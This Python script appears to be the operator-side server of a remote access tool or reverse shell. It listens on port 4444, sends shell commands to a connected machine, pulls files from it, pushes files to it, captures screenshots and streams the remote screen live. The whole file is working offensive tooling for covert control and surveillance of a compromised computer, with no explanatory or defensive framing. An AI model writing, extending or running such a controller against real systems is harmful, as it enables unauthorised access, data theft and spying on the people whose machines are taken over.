import socket
import struct
import cv2
import numpy as np
import os

HOST = "0.0.0.0"
PORT = 4444

def reliable_send(conn, data):
    data = data.encode()
    conn.send(struct.pack('>I', len(data)) + data)

def reliable_recv(conn):
    data_len = struct.unpack('>I', conn.recv(4))[0]
    return conn.recv(data_len).decode()

def recvall(sock, count):
    buf = b''
    while len(buf) < count:
        newbuf = sock.recv(count - len(buf))
        if not newbuf:
            return None
        buf += newbuf
    return buf

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)
print(f"[+] Listening on {PORT}...")
conn, addr = server.accept()
print(f"[+] Connection from {addr}")

while True:
    command = input("Shell> ")

    reliable_send(conn, command)

    if command.lower() == "exit":
        conn.close()
        break

    elif command.startswith("download "):
        filename = command.split(" ", 1)[1]
        with open(filename, "wb") as f:
            data_len = struct.unpack('>I', recvall(conn, 4))[0]
            f.write(recvall(conn, data_len))
        print(f"[+] File {filename} downloaded.")

    elif command.startswith("upload "):
        filename = command.split(" ", 1)[1]
        with open(filename, "rb") as f:
            data = f.read()
            conn.send(struct.pack('>I', len(data)) + data)
        print(f"[+] File {filename} uploaded.")

    elif command == "screenshot":
        with open("screenshot.png", "wb") as f:
            data_len = struct.unpack('>I', recvall(conn, 4))[0]
            f.write(recvall(conn, data_len))
        print("[+] Screenshot saved as screenshot.png.")

    elif command == "livescreen":
        start_signal = conn.recv(5)
        if start_signal != b"START":
            print("[-] Failed to start stream.")
            continue

        print("[+] Live screen started. Press Q to stop.")
        try:
            while True:
                frame_len = struct.unpack('>I', recvall(conn, 4))[0]
                frame_data = recvall(conn, frame_len)
                img_array = np.frombuffer(frame_data, np.uint8)
                frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR)

                if frame is None:
                    print("[-] Received empty frame, skipping...")
                    continue

                cv2.imshow("Live Screen", frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    conn.send(b"STOP")
                    cv2.destroyAllWindows()
                    break
        except KeyboardInterrupt:
            conn.send(b"STOP")
            cv2.destroyAllWindows()

    else:
        result = reliable_recv(conn)
        print(result)
